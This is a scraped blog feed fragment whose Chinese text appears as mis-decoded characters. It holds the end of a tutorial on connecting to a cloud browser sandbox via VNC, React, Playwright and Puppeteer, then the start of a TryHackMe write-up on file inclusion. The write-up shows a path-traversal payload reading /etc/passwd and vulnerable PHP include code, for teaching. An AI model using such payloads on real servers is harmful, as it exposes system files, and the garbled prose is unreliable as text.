            <span class="hljs-title function_">alert</span>(<span class="hljs-string">'è¯·æä¾› VNC URL å‚æ•°'</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'https://cdn.jsdelivr.net/gh/novnc/noVNC@v1.4.0/core/rfb.js'</span>);
            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RFB</span> = <span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>;
            
            <span class="hljs-keyword">const</span> rfb = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RFB</span>(
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'vnc-container'</span>),
                vncUrl,
                { <span class="hljs-attr">shared</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">credentials</span>: { <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> } }
            );
            
            rfb.<span class="hljs-property">scaleViewport</span> = <span class="hljs-literal">true</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<p>ä½¿ç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> webbrowser
<span class="hljs-keyword">import</span> urllib.<span class="hljs-property">parse</span>

vnc_url = sandbox.<span class="hljs-property">vnc_url</span>
encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
viewer_url = f<span class="hljs-string">"file:///path/to/vnc-viewer.html?url={encoded_url}"</span>
webbrowser.<span class="hljs-title function_">open</span>(viewer_url)
</code></pre>
<h3 data-id="heading-29">React åº”ç”¨é›†æˆ</h3>
<p><strong>æ ¸å¿ƒç»„ä»¶ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">VNCViewerProps</span> {
  <span class="hljs-attr">vncUrl</span>: <span class="hljs-built_in">string</span>;
  onConnect?: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
  onDisconnect?: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">VNCViewer</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">VNCViewerProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{ 
  vncUrl, 
  onConnect, 
  onDisconnect 
}</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> containerRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">let</span> <span class="hljs-attr">rfb</span>: <span class="hljs-built_in">any</span>;

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">initVNC</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-keyword">if</span> (!containerRef.<span class="hljs-property">current</span> || !vncUrl) <span class="hljs-keyword">return</span>;

      <span class="hljs-keyword">const</span> { <span class="hljs-attr">default</span>: <span class="hljs-variable constant_">RFB</span> } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@novnc/novnc/core/rfb'</span>);

      rfb = <span class="hljs-keyword">new</span> <span class="hljs-title function_">RFB</span>(containerRef.<span class="hljs-property">current</span>, vncUrl, {
        <span class="hljs-attr">shared</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">credentials</span>: { <span class="hljs-attr">password</span>: <span class="hljs-string">''</span> }
      });

      rfb.<span class="hljs-property">scaleViewport</span> = <span class="hljs-literal">true</span>;

      rfb.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">() =&gt;</span> onConnect?.());
      rfb.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'disconnect'</span>, <span class="hljs-function">() =&gt;</span> onDisconnect?.());
    };

    <span class="hljs-title function_">initVNC</span>();

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (rfb) rfb.<span class="hljs-title function_">disconnect</span>();
    };
  }, [vncUrl, onConnect, onDisconnect]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
      <span class="hljs-attr">ref</span>=<span class="hljs-string">{containerRef}</span> 
      <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%', <span class="hljs-attr">height:</span> '<span class="hljs-attr">600px</span>', <span class="hljs-attr">background:</span> '#<span class="hljs-attr">000</span>' }} 
    /&gt;</span></span>
  );
};
</code></pre>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">VNCViewer</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./VNCViewer'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [vncUrl, setVncUrl] = useState&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">''</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/sandbox/create'</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span> })
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">setVncUrl</span>(data.<span class="hljs-property">vnc_url</span>));
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Browser Sandbox å®æ—¶ç›‘æ§<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {vncUrl ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">VNCViewer</span> 
          <span class="hljs-attr">vncUrl</span>=<span class="hljs-string">{vncUrl}</span>
          <span class="hljs-attr">onConnect</span>=<span class="hljs-string">{()</span> =&gt;</span> console.log('å·²è¿æ¥')}
          onDisconnect={() =&gt; console.log('å·²æ–­å¼€')}
        /&gt;
      ) : (
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ­£åœ¨åˆå§‹åŒ–...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<blockquote>
<p><strong>å®Œæ•´ç¤ºä¾‹ä»£ç </strong>ï¼šåŒ…å«å®Œæ•´å‰ç«¯é›†æˆç¤ºä¾‹å’Œåç«¯ API çš„ä»£ç è¯·è®¿é—® <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faliyun%2Fagentrun-sandbox-demo" target="_blank" title="https://github.com/aliyun/agentrun-sandbox-demo" ref="nofollow noopener noreferrer">GitHub ä»“åº“</a>ã€‚</p>
</blockquote>
<h2 data-id="heading-30">Puppeteer å’Œ Playwright ç›´æ¥é›†æˆ</h2>
<p>å¦‚æœæ‚¨æ›´ç†Ÿæ‚‰ä¼ ç»Ÿçš„æµè§ˆå™¨è‡ªåŠ¨åŒ–åº“,ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ Puppeteer æˆ– Playwright è¿æ¥åˆ° Browser Sandboxã€‚</p>
<h3 data-id="heading-31">ä½¿ç”¨ Playwright</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">from</span> playwright.<span class="hljs-property">sync_api</span> <span class="hljs-keyword">import</span> sync_playwright
<span class="hljs-keyword">from</span> agentrun.<span class="hljs-property">sandbox</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">Sandbox</span>, <span class="hljs-title class_">TemplateType</span>

# åˆ›å»º <span class="hljs-title class_">Sandbox</span>
sandbox = <span class="hljs-title class_">Sandbox</span>.<span class="hljs-title function_">create</span>(
    template_type=<span class="hljs-title class_">TemplateType</span>.<span class="hljs-property">BROWSER</span>,
    template_name=<span class="hljs-string">"your-template-name"</span>,
    sandbox_idle_timeout_seconds=<span class="hljs-number">3000</span>
)

# ä½¿ç”¨ <span class="hljs-title class_">Playwright</span> è¿æ¥
<span class="hljs-keyword">with</span> <span class="hljs-title function_">sync_playwright</span>() <span class="hljs-keyword">as</span> <span class="hljs-attr">p</span>:
    browser = p.<span class="hljs-property">chromium</span>.<span class="hljs-title function_">connect_over_cdp</span>(sandbox.<span class="hljs-property">cdp_url</span>)
    page = browser.<span class="hljs-property">contexts</span>[<span class="hljs-number">0</span>].<span class="hljs-property">pages</span>[<span class="hljs-number">0</span>]
    
    # æ‰§è¡Œæ“ä½œ
    page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">"https://www.example.com"</span>)
    page.<span class="hljs-title function_">screenshot</span>(path=<span class="hljs-string">"screenshot.png"</span>)
    content = page.<span class="hljs-title function_">content</span>()
    
    browser.<span class="hljs-title function_">close</span>()

# æ¸…ç†
sandbox.<span class="hljs-title function_">delete</span>()
</code></pre>
<h3 data-id="heading-32">ä½¿ç”¨ Puppeteerï¼ˆNode.jsï¼‰</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">'puppeteer-core'</span>);

<span class="hljs-comment">// CDP URL ä» Sandbox è·å–</span>
<span class="hljs-keyword">const</span> cdpUrl = <span class="hljs-string">'wss://your-account.funagent-data-pre.cn-hangzhou.aliyuncs.com/sandboxes/xxx/ws/automation'</span>;

(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">connect</span>({
    <span class="hljs-attr">browserWSEndpoint</span>: cdpUrl,
    <span class="hljs-attr">defaultViewport</span>: <span class="hljs-literal">null</span>
  });

  <span class="hljs-keyword">const</span> page = (<span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">pages</span>())[<span class="hljs-number">0</span>];

  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">'https://www.example.com'</span>);
  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">screenshot</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'screenshot.png'</span> });

  <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();
})();
</code></pre>
<h2 data-id="heading-33">æ€»ç»“</h2>
<p>é€šè¿‡æœ¬æ•™ç¨‹ï¼Œæ‚¨å·²ç»å­¦ä¼šäº†ï¼š</p>
<ol>
<li><strong>AgentRun SDK åŸºç¡€</strong>: å¦‚ä½•ä½¿ç”¨ SDK åˆ›å»ºå’Œç®¡ç† Browser Sandbox</li>
<li><strong>LangChain é›†æˆ</strong>: å¦‚ä½•å°† Sandbox å°è£…ä¸º LangChain Tools</li>
<li><strong>VNC å¯è§†åŒ–</strong>: å¦‚ä½•åœ¨å‰ç«¯é›†æˆ VNC å®ç°å®æ—¶ç›‘æ§</li>
<li><strong>ç›´æ¥é›†æˆ</strong>: å¦‚ä½•ä½¿ç”¨ Puppeteer/Playwright ç›´æ¥è¿æ¥ Sandbox</li>
</ol>
<h2 data-id="heading-34">å¿«é€Ÿäº†è§£å‡½æ•°è®¡ç®— AgentRunï¼š</h2>
<p><strong>â€‹ä¸€å¥è¯ä»‹ç»ï¼šâ€‹</strong>å‡½æ•°è®¡ç®— AgentRun æ˜¯ä¸€ä¸ªä»¥é«˜ä»£ç ä¸ºæ ¸å¿ƒçš„ä¸€ç«™å¼ Agentic AI åŸºç¡€è®¾æ–½å¹³å°ã€‚ç§‰æŒç”Ÿæ€å¼€æ”¾å’Œçµæ´»ç»„è£…çš„ç†å¿µï¼Œä¸ºä¼ä¸šçº§ Agent åº”ç”¨æä¾›ä»å¼€å‘ã€éƒ¨ç½²åˆ°è¿ç»´çš„å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚</p>
<p><img src="https://img.alicdn.com/imgextra/i3/O1CN01OUeOeM1uz3stEqJ1Q_!!6000000006107-2-tps-3840-2120.png" alt="" loading="lazy"/></p>
<p>å‡½æ•°è®¡ç®— AgentRun æ¶æ„å›¾</p>
<p>AgentRun è¿è¡Œæ—¶åŸºäºé˜¿é‡Œäº‘å‡½æ•°è®¡ç®— FC æ„å»ºï¼Œç»§æ‰¿äº† Serverless è®¡ç®—æè‡´å¼¹æ€§ã€æŒ‰é‡ä»˜è´¹ã€é›¶è¿ç»´çš„æ ¸å¿ƒä¼˜åŠ¿ã€‚é€šè¿‡æ·±åº¦é›†æˆ AgentScopeã€Langchainã€RAGFlowã€Mem0 ç­‰ä¸»æµå¼€æºç”Ÿæ€ã€‚AgentRun å°† Serverless çš„æè‡´å¼¹æ€§ã€é›¶è¿ç»´å’ŒæŒ‰é‡ä»˜è´¹çš„ç‰¹æ€§ä¸ AI åŸç”Ÿåº”ç”¨åœºæ™¯æ·±åº¦èåˆï¼ŒåŠ©åŠ›ä¼ä¸šå®ç°æˆæœ¬ä¸æ•ˆç‡çš„æè‡´ä¼˜åŒ–ï¼Œ<strong>å¹³å‡ TCO é™ä½ 60%</strong>ã€‚</p>
<p><strong>â€‹è®©â€‹å¼€å‘è€…åªéœ€ä¸“æ³¨äº Agent çš„ä¸šåŠ¡é€»è¾‘åˆ›æ–°ï¼Œæ— éœ€å…³å¿ƒåº•å±‚åŸºç¡€è®¾æ–½ï¼Œè®© Agentic AI çœŸæ­£è¿›å…¥ä¼ä¸šç”Ÿäº§ç¯å¢ƒã€‚</strong></p>
<p>æ¬¢è¿åŠ å…¥â€œå‡½æ•°è®¡ç®— AgentRun å®¢æˆ·ç¾¤â€ä¸æˆ‘ä»¬äº¤æµï¼Œé’‰é’‰ç¾¤å·ï¼š134570017218ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€TryHackMeã€‘JPT-æ–‡ä»¶åŒ…å«]]></title>    <link>https://juejin.cn/post/7592610104442650634</link>    <guid>https://juejin.cn/post/7592610104442650634</guid>    <pubDate>2026-01-08T08:51:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592610104442650634" data-draft-id="7592559120118464558" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€TryHackMeã€‘JPT-æ–‡ä»¶åŒ…å«"/> <meta itemprop="keywords" content="å®‰å…¨"/> <meta itemprop="datePublished" content="2026-01-08T08:51:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·196533067211"/> <meta itemprop="url" content="https://juejin.cn/user/3194510624432521"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€TryHackMeã€‘JPT-æ–‡ä»¶åŒ…å«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3194510624432521/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·196533067211
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:51:51.000Z" title="Thu Jan 08 2026 08:51:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ï¼Ÿ</h3>
<p>æ–‡ä»¶åŒ…å«ï¼ˆFile Inclusionï¼‰æ˜¯ä¸€ç§ Web æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ URL å‚æ•°è®©ç½‘ç«™â€œè¯»å–å¹¶æ˜¾ç¤ºâ€æœåŠ¡å™¨ä¸Šä¸è¯¥è¢«è®¿é—®çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚å¯†ç é…ç½®ã€ç³»ç»Ÿæ–‡ä»¶ï¼‰ï¼Œç”šè‡³æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p>
<p>ã€ä¾‹å­ã€‘</p>
<ul>
<li>æ­£å¸¸è¯·æ±‚ï¼š <code>http://example.com/view.php?file=about.txt</code>Â â†’ æ˜¾ç¤ºÂ <code>about.txt</code></li>
<li>æœ‰æ¼æ´æ—¶ï¼šæ”»å‡»è€…æ”¹æˆï¼š <code>http://example.com/view.php?file=../../../etc/passwd</code><br/>
ç½‘ç«™é”™è¯¯åœ°è¯»å–äº† Linux ç³»ç»Ÿçš„ç”¨æˆ·æ–‡ä»¶Â <code>/etc/passwd</code>ï¼Œ<strong>å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²</strong>ã€‚</li>
</ul>
<p>ã€ä¸¤ç§ç±»å‹ã€‘</p>
<ul>
<li><strong>LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰</strong> ï¼š è¯»å–<strong>æœåŠ¡å™¨æœ¬åœ°</strong>çš„æ–‡ä»¶ï¼ˆå¦‚é…ç½®æ–‡ä»¶ã€æ—¥å¿—ã€å¯†ç ç­‰ï¼‰ã€‚</li>
<li><strong>RFIï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼‰</strong> ï¼šè®©æœåŠ¡å™¨å»åŠ è½½<strong>é»‘å®¢æ§åˆ¶çš„å¤–éƒ¨ç½‘å€</strong>ä¸Šçš„æ¶æ„ä»£ç ï¼ˆæ›´å±é™©ï¼Œå¯èƒ½ç›´æ¥æ¥ç®¡æœåŠ¡å™¨ï¼‰ã€‚</li>
</ul>
<p>ã€äº§ç”ŸåŸå› ã€‘</p>
<ul>
<li>æ–‡ä»¶åŒ…å«æ¼æ´å¸¸è§äºå„ç§ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œå¦‚Â PHPÂ ç­‰ï¼Œè¿™äº›è¯­è¨€ç¼–å†™å’Œå®ç°éƒ½å¾ˆå·®ã€‚</li>
<li>è¿™äº›æ¼æ´çš„ä¸»è¦é—®é¢˜åœ¨äºè¾“å…¥éªŒè¯ï¼Œå³<strong>ç”¨æˆ·è¾“å…¥æœªè¢«å‡€åŒ–æˆ–éªŒè¯</strong>ï¼Œ<strong>ç”¨æˆ·æ§åˆ¶å…¶å†…å®¹</strong>ã€‚</li>
<li>å½“è¾“å…¥æœªè¢«éªŒè¯æ—¶ï¼Œç”¨æˆ·å¯ä»¥å°†ä»»æ„è¾“å…¥ä¼ é€’ç»™å‡½æ•°ï¼Œä»è€Œå¼•å‘æ¼æ´ã€‚</li>
</ul>
<p>æ¯”å¦‚ PHP é‡Œå†™äº†ï¼š<code>include( $ _GET['file'])</code>ï¼Œå°†fileå‚æ•°ä½œæ–‡è·¯å¾„ç›´æ¥è¯»å–</p>
<h3 data-id="heading-1">æœ¬åœ°æ–‡ä»¶åŒ…å«</h3>
<p>ã€å®šä¹‰ã€‘</p>
<p>LFIÂ æ”»å‡»é€šå¸¸æ˜¯ç”±äºå¼€å‘è€…ç¼ºä¹å®‰å…¨æ„è¯†æ‰€è‡´ã€‚ä½¿ç”¨Â PHPÂ æ—¶ï¼Œä½¿ç”¨Â includeã€requireã€include_onceÂ å’ŒÂ require_onceÂ ç­‰å‡½æ•°ï¼Œå¾€å¾€ä¼šå¢åŠ ç½‘ç»œåº”ç”¨çš„è„†å¼±æ€§ï¼Œä½¿å¾—æ”»å‡»è€…æœ‰æœºä¼šå·çª¥æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶</p>
<p>ã€include( )ä¸ºä¾‹çš„æ¼æ´ã€‘</p>
<p><code>include()</code> æ˜¯ PHP çš„ä¸€ä¸ªè¯­å¥ï¼Œç”¨äºå°†å¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°å½“å‰è„šæœ¬ä¸­ã€‚</p>
<ul>
<li>
<p>å¦‚æœ <code>EN.php</code> çš„å†…å®¹æ˜¯ï¼š</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">h1</span>&gt;Welcome in English!&lt;/<span class="hljs-selector-tag">h1</span>&gt;
</code></pre>
<p>é‚£ä¹ˆè®¿é—® <code>index.php?lang=EN.php</code> æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šçœ‹åˆ°ï¼š</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">h1</span>&gt;Welcome in English!&lt;/<span class="hljs-selector-tag">h1</span>&gt;
</code></pre>
</li>
<li>
<p>å¦‚æœ <code>EN.php</code> åŒ…å« PHP ä»£ç ï¼Œæ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello, user!"</span>; <span class="hljs-meta">?&gt;</span>
</code></pre>
<p>PHP ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œæµè§ˆå™¨ä¼šçœ‹åˆ°è¾“å‡º</p>
</li>
</ul>
<p>ğŸ” è¡¥å……è¯´æ˜ï¼šPHP åœ¨è§£æ <code>include("xxx")</code> æ—¶ï¼Œä¼šæŒ‰ä»¥ä¸‹é¡ºåºæŸ¥æ‰¾æ–‡ä»¶ï¼š</p>
<ol>
<li><strong>å¦‚æœè·¯å¾„æ˜¯ç»å¯¹è·¯å¾„</strong>ï¼ˆå¦‚Â <code>/etc/passwd</code>Â æˆ–Â <code>/var/www/langs/EN.php</code>ï¼‰â†’ ç›´æ¥ä»æ ¹ç›®å½•å¼€å§‹æ‰¾ã€‚</li>
<li><strong>å¦‚æœæ˜¯ç›¸å¯¹è·¯å¾„</strong>ï¼ˆå¦‚Â <code>EN.php</code>ã€<code>langs/EN.php</code>ï¼‰â†’ ä»Â <strong>å½“å‰è„šæœ¬æ‰€åœ¨ç›®å½•</strong>Â å¼€å§‹æ‰¾ã€‚</li>
</ol>
<p>ã€å®è·µ1ã€‘</p>
<p>1ã€è¾“å…¥1ï¼Œå‘ç°Warningä¸­ä¼šæœ‰inludeï¼ˆ1ï¼‰çš„åç«¯ä»£ç </p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d3b44541e7a4470b59cf965d6c6266d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=IhbvOSCBT6QQxVMoAqQsYHE%2By9A%3D" alt="image.png" loading="lazy"/></p>
